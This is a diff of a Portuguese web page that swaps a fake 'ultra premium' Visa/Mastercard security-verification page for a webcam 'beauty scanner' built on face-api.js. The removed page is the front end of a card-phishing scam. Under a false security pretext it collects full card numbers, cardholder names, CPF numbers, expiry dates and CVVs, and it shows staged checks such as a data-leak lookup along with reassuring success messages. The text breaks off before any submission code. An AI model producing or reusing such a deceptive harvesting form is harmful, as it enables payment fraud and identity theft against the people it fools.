@@ -2,1418 +2,318 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verificação Ultra Premium - Visa & Mastercard</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner de Beleza Premium</title>
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
         :root {
-            --visa-blue: #1a1f71;
-            --visa-gold: #f7b600;
-            --mastercard-red: #eb001b;
-            --mastercard-yellow: #f79e1b;
-            --secure-green: #4CAF50;
-            --loading-orange: #FF9800;
-            --error-red: #F44336;
-            --premium-purple: #6a0dad;
-            --premium-gold: #ffd700;
-            --dark-bg: #0f0c29;
-            --darker-bg: #0a081f;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --text-primary: #ffffff;
-            --text-secondary: rgba(255, 255, 255, 0.8);
+            --primary: #ff2d75;
+            --secondary: #ff7aa8;
+            --accent: #ff4d8d;
+            --dark: #1a0b14;
+            --light: #fff5f7;
         }
-        
-        * {
-            box-sizing: border-box;
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: var(--dark);
+            color: var(--light);
             margin: 0;
             padding: 0;
-        }
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, var(--dark-bg), #302b63, var(--darker-bg));
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            color: var(--text-primary);
-            line-height: 1.6;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 30%, rgba(106, 13, 173, 0.15) 0%, transparent 25%),
-                radial-gradient(circle at 80% 70%, rgba(235, 0, 27, 0.15) 0%, transparent 25%),
-                radial-gradient(circle at 40% 80%, rgba(26, 31, 113, 0.15) 0%, transparent 25%);
-            z-index: -1;
-            animation: gradientShift 18s ease infinite;
-        }
-        
-        @keyframes gradientShift {
-            0% {
-                background-position: 0% 0%, 100% 100%, 50% 50%;
-            }
-            33% {
-                background-position: 100% 0%, 50% 100%, 0% 50%;
-            }
-            66% {
-                background-position: 50% 0%, 0% 100%, 100% 50%;
-            }
-            100% {
-                background-position: 0% 0%, 100% 100%, 50% 50%;
-            }
-        }
-        
-        body::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, 
-                transparent 48%, rgba(255, 255, 255, 0.03) 49%, 
-                rgba(255, 255, 255, 0.03) 51%, transparent 52%);
-            background-size: 3px 3px;
-            z-index: -1;
-            opacity: 0.3;
-            animation: shine 3s linear infinite;
-        }
-        
-        @keyframes shine {
-            from { background-position: 0 0; }
-            to { background-position: 100px 100px; }
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 900px;
-            animation: fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1);
-            perspective: 1000px;
-            margin: 20px 0;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px) rotateX(10deg); }
-            to { opacity: 1; transform: translateY(0) rotateX(0); }
-        }
-        
-        /* Estilos do Cartão Ultra Premium */
-        .card-wrapper {
-            position: relative;
-            margin-bottom: 30px;
-            transform-style: preserve-3d;
-            transition: transform 0.6s cubic-bezier(0.22, 1, 0.36, 1);
-            height: 240px;
-        }
-        
-        .card {
-            border-radius: 18px;
-            padding: 25px;
-            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.4);
-            position: relative;
-            overflow: hidden;
-            color: white;
-            transition: all 0.6s cubic-bezier(0.22, 1, 0.36, 1);
-            height: 100%;
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--glass-border);
-            background: var(--glass-bg);
-            transform-style: preserve-3d;
-        }
-        
-        .card.visa {
-            background: linear-gradient(135deg, rgba(26, 31, 113, 0.7), rgba(42, 50, 143, 0.8));
-        }
-        
-        .card.mastercard {
-            background: linear-gradient(135deg, rgba(235, 0, 27, 0.7), rgba(255, 45, 45, 0.8));
-        }
-        
-        .card.unknown {
-            background: linear-gradient(135deg, rgba(67, 67, 67, 0.7), rgba(0, 0, 0, 0.8));
-        }
-        
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent);
-            pointer-events: none;
-        }
-        
-        .card-glare {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
-            pointer-events: none;
-            opacity: 0.7;
-        }
-        
-        .card-hologram {
-            position: absolute;
-            top: 25px;
-            right: 25px;
-            width: 50px;
-            height: 35px;
-            background: linear-gradient(135deg, 
-                rgba(255, 255, 255, 0.8), 
-                rgba(255, 215, 0, 0.6), 
-                rgba(100, 255, 255, 0.4), 
-                transparent);
-            border-radius: 5px;
-            transform: rotate(15deg);
-            filter: blur(1px);
-            opacity: 0.8;
-        }
-        
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .card-logo {
-            font-weight: 600;
-            font-size: clamp(16px, 2vw, 24px);
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            letter-spacing: 1px;
-        }
-        
-        .card-logo i {
-            font-size: clamp(22px, 3vw, 30px);
-        }
-        
-        .card-chip {
-            width: 40px;
-            height: 30px;
-            background: linear-gradient(135deg, var(--premium-gold), #c0c0c0);
-            border-radius: 8px;
-            position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            height: 100vh;
             overflow: hidden;
         }
-        
-        .card-chip::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
+
+        .scanner-container {
             width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.3), transparent);
-        }
-        
-        .card-chip i {
-            color: rgba(0, 0, 0, 0.7);
-            font-size: 20px;
-            z-index: 1;
-        }
-        
-        .card-number {
-            font-size: clamp(16px, 2.5vw, 24px);
-            letter-spacing: 2px;
-            margin: 20px 0;
-            word-spacing: 8px;
-            font-family: 'Courier New', monospace;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
-            position: relative;
-            z-index: 2;
-            font-weight: 500;
-        }
-        
-        .card-details {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .card-expiry, .card-holder, .card-cpf, .card-cvv {
-            font-size: clamp(12px, 1.5vw, 14px);
-            opacity: 0.95;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
-        }
-        
-        .card-holder {
-            text-transform: uppercase;
-            max-width: 70%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            font-weight: 500;
-        }
-        
-        .card-cpf {
-            text-transform: uppercase;
-            max-width: 70%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            font-weight: 500;
-        }
-        
-        .card-expiry {
-            text-transform: uppercase;
-            max-width: 70%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            font-weight: 500;
-        }
-        
-        .card-cvv {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .card-cvv i {
-            font-size: 12px;
-            opacity: 0.7;
-        }
-        
-        /* Estilos do Formulário Ultra Premium */
-        .form-container {
-            background: rgba(15, 12, 41, 0.7);
-            padding: 25px;
-            border-radius: 18px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.25);
-            backdrop-filter: blur(15px);
-            border: 1px solid var(--glass-border);
-            animation: slideUp 0.8s cubic-bezier(0.22, 1, 0.36, 1);
-            transform-style: preserve-3d;
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px) rotateX(15deg); }
-            to { opacity: 1; transform: translateY(0) rotateX(0); }
-        }
-        
-        .form-header {
+            max-width: 500px;
             text-align: center;
-            margin-bottom: 25px;
+            padding: 20px;
+        }
+
+        .scanner-box {
             position: relative;
-        }
-        
-        .form-header::after {
-            content: '';
-            position: absolute;
-            bottom: -12px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--premium-purple), transparent);
-            border-radius: 2px;
-        }
-        
-        .form-header h2 {
-            color: #fff;
-            margin-bottom: 8px;
-            font-size: clamp(18px, 2.5vw, 24px);
-            font-weight: 600;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            letter-spacing: 0.5px;
-        }
-        
-        .form-header p {
-            color: var(--text-secondary);
-            font-size: clamp(13px, 1.5vw, 15px);
-            font-weight: 300;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 500;
-            color: #fff;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        label i {
-            font-size: 16px;
-            opacity: 0.8;
-        }
-        
-        input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1.5px solid rgba(255, 255, 255, 0.15);
-            border-radius: 10px;
-            font-size: 15px;
-            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
-            background: rgba(0, 0, 0, 0.25);
-            color: #fff;
-            font-family: 'Poppins', sans-serif;
-            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
+            margin: 20px 0;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(255, 45, 117, 0.5);
         }
-        
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-            font-weight: 300;
+
+        #videoElement {
+            width: 100%;
+            display: block;
         }
-        
-        input:focus {
-            border-color: var(--premium-purple);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(106, 13, 173, 0.3), inset 0 1px 3px rgba(0, 0, 0, 0.2);
-            background: rgba(0, 0, 0, 0.35);
-            transform: translateY(-2px);
+
+        #canvasElement {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
         }
-        
-        .form-row {
-            display: flex;
-            gap: 15px;
+
+        .scanner-message {
+            margin: 20px 0;
+            font-size: 1.2rem;
+            min-height: 60px;
         }
-        
-        .form-row .form-group {
-            flex: 1;
-        }
-        
-        button {
-            background: linear-gradient(135deg, var(--premium-purple), #5a0b9a);
+
+        .scanner-button {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 1rem;
             cursor: pointer;
-            width: 100%;
-            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            transition: all 0.3s ease;
+        }
+
+        .scanner-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 45, 117, 0.4);
+        }
+
+        .detection-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70%;
+            height: 70%;
+            border: 3px dashed var(--accent);
+            border-radius: 10px;
+            pointer-events: none;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.25);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
-        }
-        
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.6s;
-        }
-        
-        button:hover {
-            background: linear-gradient(135deg, #5a0b9a, var(--premium-purple));
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.35);
-        }
-        
-        button:hover::before {
-            left: 100%;
-        }
-        
-        button:disabled {
-            background: rgba(85, 85, 85, 0.5);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        button:disabled:hover::before {
-            left: -100%;
-        }
-        
-        /* Estilos da Verificação Ultra Premium */
-        .verification-container {
-            margin-top: 25px;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            background: rgba(0, 0, 0, 0.25);
-            border: 1px solid var(--glass-border);
-            transform: translateZ(20px);
-        }
-        
-        .verification-step {
-            padding: 14px 20px;
-            border-left: 4px solid transparent;
-            background-color: rgba(0, 0, 0, 0.3);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
-        }
-        
-        .verification-step:not(:last-child) {
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-        }
-        
-        .verification-step.active {
-            background-color: rgba(106, 13, 173, 0.25);
-            border-left-color: var(--premium-purple);
-        }
-        
-        .verification-step.completed {
-            background-color: rgba(76, 175, 80, 0.25);
-            border-left-color: var(--secure-green);
-        }
-        
-        .verification-step.failed {
-            background-color: rgba(244, 67, 54, 0.25);
-            border-left-color: var(--error-red);
-        }
-        
-        .verification-step .step-text {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 14px;
-            font-weight: 400;
-        }
-        
-        .verification-step .step-icon {
-            font-size: 16px;
-            min-width: 16px;
-        }
-        
-        .verification-step .status-icon {
-            font-size: 14px;
+            color: var(--accent);
+            font-size: 1.5rem;
             opacity: 0.7;
         }
-        
-        .verification-result {
-            text-align: center;
-            margin-top: 20px;
-            padding: 20px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 16px;
+
+        .loading {
             display: none;
-            animation: fadeIn 0.5s ease-out;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            border: 1px solid var(--glass-border);
-            background: rgba(0, 0, 0, 0.3);
-            transform: translateZ(30px);
-        }
-        
-        .verification-result i {
-            margin-right: 10px;
-            font-size: 18px;
-        }
-        
-        .verification-result.secure {
-            background: linear-gradient(135deg, rgba(76, 175, 80, 0.25), rgba(46, 125, 50, 0.35));
-            color: #c8e6c9;
-            border-color: rgba(76, 175, 80, 0.4);
-            display: none;
-        }
-        
-        .verification-result.insecure {
-            background: linear-gradient(135deg, rgba(244, 67, 54, 0.25), rgba(183, 28, 28, 0.35));
-            color: #ffcdd2;
-            border-color: rgba(244, 67, 54, 0.4);
-            display: none;
-        }
-        
-        /* Loader Ultra Premium */
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s cubic-bezier(0.55, 0.15, 0.45, 0.85) infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* Responsividade Avançada */
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-            
-            .card-wrapper {
-                height: 200px;
-                margin-bottom: 25px;
-            }
-            
-            .card {
-                padding: 20px;
-            }
-            
-            .card-header {
-                margin-bottom: 20px;
-            }
-            
-            .card-number {
-                margin: 15px 0;
-                font-size: clamp(14px, 3vw, 18px);
-            }
-            
-            .card-hologram {
-                top: 20px;
-                right: 20px;
-                width: 40px;
-                height: 30px;
-            }
-            
-            .form-container {
-                padding: 20px;
-            }
-            
-            .form-row {
-                flex-direction: column;
-                gap: 0;
-            }
-            
-            button {
-                padding: 14px;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .card-wrapper {
-                height: 180px;
-            }
-            
-            .card {
-                padding: 15px;
-            }
-            
-            .card-logo i {
-                font-size: 20px;
-            }
-            
-            .card-chip {
-                width: 35px;
-                height: 25px;
-            }
-            
-            .card-chip i {
-                font-size: 16px;
-            }
-            
-            .card-number {
-                letter-spacing: 1px;
-                word-spacing: 5px;
-            }
-            
-            .form-container {
-                padding: 15px;
-            }
-            
-            .form-header h2 {
-                font-size: 18px;
-            }
-            
-            input {
-                padding: 12px 14px;
-            }
-            
-            .verification-step {
-                padding: 12px 15px;
-            }
-            
-            .verification-step .step-text {
-                font-size: 13px;
-            }
-        }
-        
-        /* Efeitos 3D no hover */
-        .card-wrapper:hover {
-            transform: rotateY(5deg) rotateX(2deg) translateY(-5px);
-        }
-        
-        /* Efeito de flutuação sutil */
-        @keyframes floatCard {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-        
-        .card-wrapper {
-            animation: floatCard 6s ease-in-out infinite;
-        }
-        
-        /* Efeito de partículas */
-        .particles {
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
-            z-index: -1;
+            background: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
         }
-        
-        .particle {
-            position: absolute;
-            background: rgba(255, 255, 255, 0.5);
-            border-radius: 50%;
-            animation: floatParticle linear infinite;
-        }
-        
-        @keyframes floatParticle {
-            0% { transform: translateY(0) translateX(0); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
+
+        @media (max-width: 600px) {
+            .scanner-container {
+                padding: 10px;
+            }
+            
+            .scanner-message {
+                font-size: 1rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="particles" id="particles"></div>
-    
-    <div class="container">
-        <div class="card-wrapper" id="card-wrapper">
-            <div class="card unknown" id="card-preview">
-                <div class="card-glare"></div>
-                <div class="card-hologram"></div>
-                <div class="card-header">
-                    <div class="card-logo" id="card-logo">
-                        <i class="fas fa-credit-card"></i>
-                        <span>PREMIUM CARD</span>
-                    </div>
-                    <div class="card-chip">
-                        <i class="fas fa-microchip"></i>
-                    </div>
-                </div>
-                <div class="card-number" id="display-card-number">•••• •••• •••• ••••</div>
-                <div class="card-details">
-                    <div>
-                        <div class="card-holder" id="display-card-holder">NOME DO TITULAR</div>
-                        <div class="card-cpf" id="display-card-cpf">•••.•••.•••-••</div>
-                        <div class="card-expiry" id="display-card-expiry">MM/AA</div>
-                    </div>
-                    <div class="card-cvv">
-                        <i class="fas fa-lock"></i>
-                        <span id="display-card-cvv">•••</span>
-                    </div>
-                </div>
-            </div>
+    <div class="scanner-container">
+        <h1>Scanner de Beleza</h1>
+        <div class="scanner-box">
+            <video id="videoElement" width="500" height="375" autoplay muted></video>
+            <canvas id="canvasElement" width="500" height="375"></canvas>
+            <div class="detection-guide">Posicione seu rosto aqui</div>
         </div>
-        
-        <div class="form-container">
-            <div class="form-header">
-                <h2><i class="fas fa-shield-alt"></i> VERIFICAÇÃO ULTRA PREMIUM</h2>
-                <p>Digite os dados do seu cartão para verificação de segurança completa</p>
-            </div>
-            
-            <form id="card-form">
-                <div class="form-group">
-                    <label for="card-number"><i class="fas fa-credit-card"></i> Número do Cartão</label>
-                    <input type="text" id="card-number" maxlength="19" placeholder="1234 5678 9012 3456" required>
-                </div>
-                
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="card-holder"><i class="fas fa-user-tie"></i> Nome do Titular</label>
-                        <input type="text" id="card-holder" placeholder="Como no cartão" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="card-cpf"><i class="fas fa-id-card"></i> CPF do Titular</label>
-                        <input type="text" id="card-cpf" maxlength="14" placeholder="000.000.000-00" required>
-                    </div>
-                </div>
-                
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="card-expiry"><i class="fas fa-calendar-check"></i> Validade</label>
-                        <input type="text" id="card-expiry" maxlength="5" placeholder="MM/AA" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="card-cvv"><i class="fas fa-lock"></i> Código CVV</label>
-                        <input type="text" id="card-cvv" maxlength="3" placeholder="•••" required>
-                    </div>
-                </div>
-                
-                <button type="submit" id="submit-btn">
-                    <span id="btn-text">VERIFICAR AGORA</span>
-                    <i class="fas fa-lock" id="btn-icon"></i>
-                </button>
-            </form>
-            
-            <div class="verification-container" id="verification-steps">
-                <div class="verification-step" id="step-1">
-                    <div class="step-text">
-                        <i class="fas fa-check-circle step-icon completed-icon" style="display: none;"></i>
-                        <i class="fas fa-exclamation-circle step-icon failed-icon" style="display: none;"></i>
-                        <i class="fas fa-spinner step-icon loading-icon" style="display: none;"></i>
-                        <span>Verificando formato do cartão</span>
-                    </div>
-                    <i class="fas fa-chevron-right status-icon"></i>
-                </div>
-                
-                <div class="verification-step" id="step-2">
-                    <div class="step-text">
-                        <i class="fas fa-check-circle step-icon completed-icon" style="display: none;"></i>
-                        <i class="fas fa-exclamation-circle step-icon failed-icon" style="display: none;"></i>
-                        <i class="fas fa-spinner step-icon loading-icon" style="display: none;"></i>
-                        <span>Validando algoritmo de segurança</span>
-                    </div>
-                    <i class="fas fa-chevron-right status-icon"></i>
-                </div>
-                
-                <div class="verification-step" id="step-3">
-                    <div class="step-text">
-                        <i class="fas fa-check-circle step-icon completed-icon" style="display: none;"></i>
-                        <i class="fas fa-exclamation-circle step-icon failed-icon" style="display: none;"></i>
-                        <i class="fas fa-spinner step-icon loading-icon" style="display: none;"></i>
-                        <span>Consultando vazamentos de dados</span>
-                    </div>
-                    <i class="fas fa-chevron-right status-icon"></i>
-                </div>
-                
-                <div class="verification-step" id="step-4">
-                    <div class="step-text">
-                        <i class="fas fa-check-circle step-icon completed-icon" style="display: none;"></i>
-                        <i class="fas fa-exclamation-circle step-icon failed-icon" style="display: none;"></i>
-                        <i class="fas fa-spinner step-icon loading-icon" style="display: none;"></i>
-                        <span>Verificando sistema anti-fraude</span>
-                    </div>
-                    <i class="fas fa-chevron-right status-icon"></i>
-                </div>
-            </div>
-            
-            <div class="verification-result secure" id="secure-result">
-                <i class="fas fa-shield-alt"></i> Cartão verificado com sucesso! Seguro e protegido 🔐
-            </div>
-            
-            <div class="verification-result insecure" id="insecure-result">
-                <i class="fas fa-exclamation-triangle"></i> Problemas detectados na verificação de segurança
+        <div class="scanner-message" id="scannerMessage">
+            Clique em "Iniciar Scanner" para começar a análise
+        </div>
+        <button class="scanner-button" id="scanButton">Iniciar Scanner</button>
+    </div>
+
+    <div class="loading" id="loadingOverlay">
+        <div style="text-align: center;">
+            <div style="font-size: 1.5rem; margin-bottom: 20px;">Carregando modelos de IA...</div>
+            <div style="width: 100%; height: 5px; background: rgba(255,255,255,0.2); border-radius: 5px;">
+                <div id="loadingProgress" style="height: 100%; width: 0%; background: var(--accent); border-radius: 5px;"></div>
             </div>
         </div>
     </div>
 
     <script>
         // Elementos do DOM
-        const cardForm = document.getElementById('card-form');
-        const cardNumberInput = document.getElementById('card-number');
-        const cardHolderInput = document.getElementById('card-holder');
-        const cardCpfInput = document.getElementById('card-cpf');
-        const cardExpiryInput = document.getElementById('card-expiry');
-        const cardCvvInput = document.getElementById('card-cvv');
-        const submitBtn = document.getElementById('submit-btn');
-        const btnText = document.getElementById('btn-text');
-        const btnIcon = document.getElementById('btn-icon');
-        const cardWrapper = document.getElementById('card-wrapper');
-        
-        // Elementos de exibição do cartão
-        const cardPreview = document.getElementById('card-preview');
-        const displayCardNumber = document.getElementById('display-card-number');
-        const displayCardHolder = document.getElementById('display-card-holder');
-        const displayCardCpf = document.getElementById('display-card-cpf');
-        const displayCardExpiry = document.getElementById('display-card-expiry');
-        const displayCardCvv = document.getElementById('display-card-cvv');
-        const cardLogo = document.getElementById('card-logo');
-        
-        // Elementos de verificação
-        const verificationSteps = document.getElementById('verification-steps').children;
-        const secureResult = document.getElementById('secure-result');
-        const insecureResult = document.getElementById('insecure-result');
-        
-        // Criar partículas
-        function createParticles() {
-            const particlesContainer = document.getElementById('particles');
-            const particleCount = window.innerWidth < 768 ? 20 : 30;
-            
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.classList.add('particle');
-                
-                // Tamanho aleatório entre 1px e 3px
-                const size = Math.random() * 2 + 1;
-                particle.style.width = `${size}px`;
-                particle.style.height = `${size}px`;
-                
-                // Posição inicial aleatória
-                particle.style.left = `${Math.random() * 100}%`;
-                particle.style.bottom = `-10px`;
-                
-                // Duração da animação aleatória
-                const duration = Math.random() * 20 + 10;
-                particle.style.animationDuration = `${duration}s`;
-                
-                // Atraso inicial aleatório
-                particle.style.animationDelay = `${Math.random() * 10}s`;
-                
-                particlesContainer.appendChild(particle);
-            }
-        }
-        
-        // Inicializar partículas
-        createParticles();
-        
-        // Efeito 3D no cartão com movimento do mouse
-        function handleCardTilt(e) {
-            const x = e.clientX - window.innerWidth / 2;
-            const y = e.clientY - window.innerHeight / 2;
-            
-            const tiltX = (y / window.innerHeight) * 10;
-            const tiltY = -(x / window.innerWidth) * 10;
-            
-            cardWrapper.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-5px)`;
-        }
-        
-        // Resetar posição do cartão
-        function resetCardTilt() {
-            cardWrapper.style.transform = 'rotateX(0) rotateY(0) translateY(0)';
-        }
-        
-        // Adicionar listeners para efeito 3D
-        document.addEventListener('mousemove', handleCardTilt);
-        document.addEventListener('mouseleave', resetCardTilt);
-        
-        // Formatação do número do cartão
-        cardNumberInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formatted = '';
-            
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formatted += ' ';
-                }
-                formatted += value[i];
-            }
-            
-            e.target.value = formatted;
-            displayCardNumber.textContent = formatted || '•••• •••• •••• ••••';
-            
-            // Identifica a bandeira do cartão
-            detectCardBrand(value);
-        });
-        
-        // Formatação do CPF
-        cardCpfInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            
-            if (value.length > 3) {
-                value = value.substring(0, 3) + '.' + value.substring(3);
-            }
-            if (value.length > 7) {
-                value = value.substring(0, 7) + '.' + value.substring(7);
-            }
-            if (value.length > 11) {
-                value = value.substring(0, 11) + '-' + value.substring(11);
-            }
-            
-            e.target.value = value.substring(0, 14);
-            displayCardCpf.textContent = value || '•••.•••.•••-••';
-        });
-        
-        // Formatação da data de expiração
-        cardExpiryInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/[^0-9]/g, '');
-            
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            
-            e.target.value = value;
-            displayCardExpiry.textContent = value || 'MM/AA';
-        });
-        
-        // Atualização do nome do titular
-        cardHolderInput.addEventListener('input', function(e) {
-            displayCardHolder.textContent = e.target.value.toUpperCase() || 'NOME DO TITULAR';
-        });
-        
-        // Atualização do CVV
-        cardCvvInput.addEventListener('input', function(e) {
-            displayCardCvv.textContent = e.target.value || '•••';
-        });
-        
-        // Detecta a bandeira do cartão (Visa ou Mastercard)
-        function detectCardBrand(cardNumber) {
-            // Visa: começa com 4, 13 ou 16 dígitos
-            if (/^4/.test(cardNumber)) {
-                cardPreview.classList.remove('unknown', 'mastercard');
-                cardPreview.classList.add('visa');
-                cardLogo.innerHTML = '<i class="fab fa-cc-visa"></i> <span>VISA</span>';
-                return 'visa';
-            }
-            // Mastercard: começa com 51-55 ou 2221-2720, 16 dígitos
-            else if (/^5[1-5]/.test(cardNumber) || /^2[2-7][2-9][0-9]/.test(cardNumber)) {
-                cardPreview.classList.remove('unknown', 'visa');
-                cardPreview.classList.add('mastercard');
-                cardLogo.innerHTML = '<i class="fab fa-cc-mastercard"></i> <span>MASTERCARD</span>';
-                return 'mastercard';
-            }
-            // Bandeira desconhecida
-            else {
-                cardPreview.classList.remove('visa', 'mastercard');
-                cardPreview.classList.add('unknown');
-                cardLogo.innerHTML = '<i class="fas fa-credit-card"></i> <span>PREMIUM CARD</span>';
-                return 'unknown';
-            }
-        }
-        
-        // Algoritmo de Luhn para validar número do cartão
-        function validateLuhn(cardNumber) {
-            let sum = 0;
-            let shouldDouble = false;
-            
-            for (let i = cardNumber.length - 1; i >= 0; i--) {
-                let digit = parseInt(cardNumber.charAt(i));
-                
-                if (shouldDouble) {
-                    digit *= 2;
-                    if (digit > 9) {
-                        digit -= 9;
-                    }
-                }
-                
-                sum += digit;
-                shouldDouble = !shouldDouble;
-            }
-            
-            return (sum % 10) === 0;
-        }
-        
-        // Valida a data de expiração
-        function validateExpiry(expiry) {
-            if (!expiry || expiry.length < 5) return false;
-            
-            const [month, year] = expiry.split('/');
-            if (!month || !year) return false;
-            
-            const now = new Date();
-            const currentYear = now.getFullYear() % 100;
-            const currentMonth = now.getMonth() + 1;
-            
-            // Verifica se o mês é válido (1-12)
-            if (parseInt(month) < 1 || parseInt(month) > 12) return false;
-            
-            // Verifica se o ano é maior que o atual
-            if (parseInt(year) > currentYear) return true;
-            
-            // Se for o mesmo ano, verifica se o mês é maior ou igual ao atual
-            if (parseInt(year) === currentYear && parseInt(month) >= currentMonth) return true;
-            
-            return false;
-        }
-        
-        // Valida o CPF
